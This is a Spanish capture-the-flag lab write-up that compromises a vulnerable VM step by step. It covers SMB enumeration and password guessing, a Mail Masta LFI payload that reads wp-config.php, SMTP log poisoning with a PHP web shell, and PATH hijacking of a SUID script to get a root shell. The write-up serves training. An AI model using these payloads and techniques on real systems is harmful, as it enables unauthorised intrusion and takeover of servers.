PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

-Hay que añadir el dominio symfonos.local al fichero /etc/host

-En el puerto 80 hay una foto

-Hacemos enumeración web pero no encontramos nada

-Nos autenticamos por smb y vemos los siguientes directorios:
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	helios          Disk      Helios personal share
	anonymous       Disk      
	IPC$            IPC       IPC Service (Samba 4.5.16-Debian)

-Tenemos permiso para entrar en 'anonymous' , pero no en helios.

-Entramos en anonymous y descargamos el fichero attention.txt:
	-smbclient -N //192.168.1.139/anonymous
	-get attention.txt
	-contenido de attention.txt: 
		'Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 
		 Next person I find using one of these passwords will be fired!
		-Zeus'

-Nos autenticamos con el usuario helios y probamos la contraseña qwerty:
	smbclient //192.168.1.139/helios -U helios
	password: qwerty
	smb: \> ls
		get research.txt                  
		get todo.txt  

-Contenido del fichero todo.txt:
	   1-Binge watch Dexter
	   2-Dance
	   3-Work on /h3l105

-Vamos al dominio http://192.168.1.139/h3l105 y nos encontramos un wordpress

-Utilizamos Wpscan para listar usuarios y plugins
	wpscan --url http://symfonos.local/h3l105/ -e ap,u
	-User: admin
	-Plugin vulnerable: mail masta 1.0

EXTRA: Forma que tiene S4vitar de listar los plugins existentes en la máquina sin usar Wpscan:
	curl -s -X GET "http://symfonos.local/h3l105/" | grep "wp-content" | grep -oP "'.*?'" | grep "symfonos.local" | cut -d '/' -f 1-7 | sort -u | grep plugins
		'http://symfonos.local/h3l105/wp-content/plugins/mail-masta
		'http://symfonos.local/h3l105/wp-content/plugins/site-editor
		

-Buscamos mail masta 1.0 exploit en github y analizamos como funciona. Es una vulnerabilidad LFI (Local File Inclusion). Con el siguiente PHP Filter podemos ver el contenido del /wp-config.php
	-http://192.168.1.139/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php

-Decodificamos el contenido del fichero wp-config.php que nos ha devuelto en base64:
	-echo 'contenido' | base64 -d
	-Contenido:
		/** MySQL database username */
		define( 'DB_USER', 'wordpress' );
		/** MySQL database password */
		define( 'DB_PASSWORD', 'password123' );
		/** MySQL hostname */
		define( 'DB_HOST', 'localhost' );

-Intentamos autenticarnos en /wp-login y sorprendentemente NO FUNCIONA. Debe ser un Rabbit Hole.

-Como está abierto el puerto 25 (SMTP) en la máquina, vamos a intentar hacer un LFI to RCE vía SMTP. Para ello vamos a autenticarnos en SMTP por el puerto 25 y vamos a mandar un correo con un código PHP malicioso:
	telnet 192.168.1.139 25
	helo ok (Se utiliza para identificar al cliente que está enviando el correo. Somos el cliente 'ok')
	mail from: cualquiercosa (Enviamos el correo desde cualquier mail)
	rcpt to: helios (Lo enviamos al usuario helios)
	data (Le decimos que vamos a enviarle datos)
	354 End data with <CR><LF>.<CR><LF> (El servidor dice que los datos deben ir entre <>)
	subject: <?php echo system($_GET["cmd"]); ?> (Inyectamos una web shell)
	. (Ponemos el punto para acabar)
	quit  (Salimos del protocolo SMTP)


-Con la webshell subida, vamos a la ruta en la URL y ejecutamos comandos en el servidor:
	http://192.168.1.139/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=id
	-subject: uid=1000(helios) gid=1000(helios) groups=1000(helios)

-La webshell está funcionando, nos mandamos una reverse shell y obtenemos acceso al servidor en nuestra máquina

-Nota: También podríamos haber subido una reverse shell directamente, de la siguiente forma:
	<?php system("BASH Reverse Shell");?>


## Escalada de Privilegios

-Tenemos permisos SUID en el script /opt/statuscheck

-Hay que abrirlo con strings para ver su contenido:
	strings /opt/statuscheck

-Observamos su contenido y vemos que ejecuta el comando 'curl' sin aplicar la RUTA ABSOLUTA, por lo que podríamos realizar un PATH HIJACKING para obtener privilegios de root

-Nos vamos a /tmp y creamos un archivo llamado 'curl'. Dentro inyectamos el código para otorgar permisos SUID a la /bin/bash. Le damos permisos de ejecución a nuestro archivo:
	nano curl --> chmod +s /bin/bash
	chmod +x curl

-Cambiamos el PATH para que cuando ejecutemos el script y se ejecute el comando 'curl' con los permisos SUID, el sistema empiece a buscar binarios desde el directorio /tmp que es dónde tenemos el archivo 'curl' con el código malicioso:
	-PATH antes de hacer PATH HIJACKING:
		-echo $PATH: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
	-Exportamos el PATH al directorio /tmp:
		export PATH=/tmp:$PATH
	-PATH después de hacer PATH HIJACKING:
		-echo $PATH: /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

-Por último, ejecutamos el script en el que tenemos permisos SUID y dentro ejecuta el comando curl sin Ruta Absoluta. Se va a ejecutar nuestro archivo malicioso curl ya que el PATH va a empezar a buscar desde el directorio /tmp:
	-/opt/statuscheck
		bash-4.4$
		bash -p 
		bash-4.4# whoami 
		root




